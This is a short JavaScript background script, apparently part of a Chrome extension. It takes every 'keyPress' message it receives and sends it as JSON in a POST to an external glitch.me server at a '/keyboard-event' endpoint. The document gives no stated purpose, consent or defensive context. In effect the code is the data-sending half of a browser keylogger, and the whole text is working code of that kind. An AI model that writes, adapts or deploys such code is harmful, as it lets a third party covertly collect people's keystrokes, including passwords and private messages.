chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  try {
    if (message.type === "keyPress") {
		fetch("https://melon-military-warbler.glitch.me/keyboard-event", {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
  },
  body: JSON.stringify(message),
	})
        .then((response) => console.log("Event sent:", response.status))
        .catch((error) => console.error("Error sending event:", error));
    }
  } catch (error) {
    console.error("Error in background message handler:", error);
  }
});
